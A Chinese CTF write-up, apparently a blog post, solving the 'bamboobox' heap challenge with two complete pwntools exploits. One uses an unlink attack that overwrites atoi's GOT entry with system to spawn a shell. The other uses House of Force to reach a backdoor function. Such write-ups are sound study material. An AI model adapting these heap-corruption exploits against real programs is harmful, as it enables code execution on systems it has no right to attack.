---
title: BUU-hitcontraining_bamboobox
date: 2022-09-01 19:33:45
tags:
- pwn
- heap
- buu刷题
---

Unlink在做完`stkof`后仍是有点理解问题，这题较`sktof`简单些，正好拿来巩固了一下unlink。虽说是做出来了，但是原题是`House of Force`的例题，顺便也记录一下。

<!-- more -->

# BUU-hitcontraining_bamboobox

因为Buu的flag无法用给定的magic函数获取，所以只能多走几步，通过获取shell来get flag

![checksec](/img/image-20220901173046870.png)

## ida分析

### add_item

add_item流程：1、获取item_name长度 2、在itemlist记录item_name和chunk_addr

![image-20220901173643685](/img/image-20220901173643685.png)

### change_item

允许输入任意长数据，存在堆溢出

![image-20220901174104795](/img/image-20220901174104795.png)

### remove_item

无UAF

## exp1 Unlink

程序仅利用itemlist来记录chunk情况且got表可改写，考虑修改itemlist处指针的指向。利用Unlink修改content_addr处为atoi.got地址，修改got表项为system后键入`/bin/sh\x00`获取shell

```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')

p = process("bamboobox")
elf= ELF('./bamboobox')
libc=ELF("ubuntu16_x64.so")

def dbg():
	gdb.attach(p)
	pause()

def add(size,payload):
	p.recvuntil(b"Your choice:")
	p.sendline(b'2')
	p.recvuntil(b'Please enter the length of item name:')
	p.sendline(str(size))
	p.recvuntil(b"Please enter the name of item:")
	p.send(payload)

def show():
	p.recvuntil(b"Your choice:")
	p.sendline(b'1')

def change(idx,size,payload):
	p.recvuntil(b"Your choice:")
	p.sendline(b'3')
	p.recvuntil(b'Please enter the index of item:')
	p.sendline(str(idx))
	p.recvuntil(b'Please enter the length of item name:')
	p.sendline(str(size))
	p.recvuntil(b"Please enter the new name of the item:")
	p.send(payload)

def dele(idx):
	p.recvuntil(b"Your choice:")
	p.sendline(b'4')
	p.recvuntil(b"Please enter the index of item:")
	p.sendline(str(idx))

add(0x16,b'a'*0x18) #无用chunk malloc出来玩的=.=
add(0x30,b'b'*0x30) #被unlink的chunk
add(0x80,b'c'*0x80) #触发unlink的chunk

target = 0x6020d8 #itemlist chunk1 content_addr
fake_fd = target - 0x18 #绕过unlink判定
fake_bk = target - 0x10

payload=b'a'*8 + p64(0x31) + p64(fake_fd) + p64(fake_bk) + b'b'*0x10
#payload = fake_presize + fake_size + fake_fd + fake_bk + padding
payload+= p64(0x30) + p64(0x90)
#payload += presize(fake) + size 堆溢出构造unlink条件
change(1,len(payload),payload)
dele(2) #触发unlink
#unlink结果：itemlist中chunk1的content_addr修改为了itemlist[0]地址
atoi_got = elf.got["atoi"]
payload = p64(0x16) + p64(atoi_got)
change(1,len(payload),payload)#修改chunk0的content_addr为atoi.got地址
show() 
p.recvuntil(b"0 : ")
atoi_addr = u64(p.recv(6).ljust(8,b"\x00"))
success("atoi_addr:"+hex(atoi_addr))
#泄露libc基址
libc_base = atoi_addr - libc.symbols["atoi"]
system_addr=libc_base + libc.symbols["system"]
success("system: " + hex(system_addr) )
#修改atoi.got表项为system地址
payload=p64(system_addr)
#利用atoi获取shell
change(0,len(payload),payload)
p.recvuntil("Your choice:")
p.sendline(b"/bin/sh\x00")
p.sendline(b"cat flag")

p.interactive()
```

### before unlink

![parseheap](/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-01%20185628.png)

![itemlist](/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-01%20190225.png)

### after unlink

![parseheap](/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-01%20190443.png)

![itemlist](/img/image-20220901191251286.png)

### after change

![itemlist](/img/image-20220901191504206.png)

修改了chunk0处chunk_addr的指针指向。因为如下语句`0x6020d0`处的字节被置为0

```c
*(*&itemlist[4 * v1 + 2] + read(0, *&itemlist[4 * v1 + 2], v2)) = 0;// 堆溢出
```

### 泄露基地址及修改got表

![image-20220901192048246](/img/image-20220901192048246.png)

![image-20220901192243604](/img/image-20220901192243604.png)

## exp2 house of force

```python
magic_addr = 0x400d49
add(0x20,b"a"*0x20)

payload = 0x28*b'b'+p64(0xffffffffffffffff)

change(0,0x30,payload)

#top_chunk=0x212f040, target=0x212f018, top_chunk_target=0x212f000(需要是MALLOC_ALIGN倍数)
#offset =0x40 即((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) == -0x50
req = -0x50 - 15 - 8
p.recvuntil(b"Your choice:")
p.sendline(b'2')
p.recvuntil(b'Please enter the length of item name:')
p.sendline(str(req))
p.recvuntil(b"Please enter the name of item:")
p.sendline(b'zzzz')
add(0x10,p64(magic_addr) * 2)

p.interactive()
```

### after change

![屏幕截图 2022-09-02 162628](/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-02%20162628.png)

### House of Force

![屏幕截图 2022-09-02 170139](/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-02%20170139.png)

再次malloc获取0x23ad018的控制权限，写入后门地址，获取flag

### 问题

- 在实现house of force时，read函数理论上读取了`zzzz\n`写入到`0x23ad060`位置。在动态调试时程序确实执行了这一操作，但是结果并未往目标位置写入内容

- wiki上的exp中第一次malloc的大小为`0x30`，其house of force的偏移值计算为`-(0x60+ 0xf+ 0x8)`。

  理论上当第一次malloc的大小为`0x10`时，偏移值计算为`-(0x40+ 0xf+ 0x8)`，此时`top chunk`大小为`0x38`，仍然可以分配出`0x20`控制target。但是在实现过程当中，程序在`malloc(-(0x40+ 0xf+ 0x8))`后将无法继续运行。

感觉HOF所需的前置条件有些苛刻，过程也不如前些方法来得可控(?)，希望过些时间能把问题弄清楚吧.
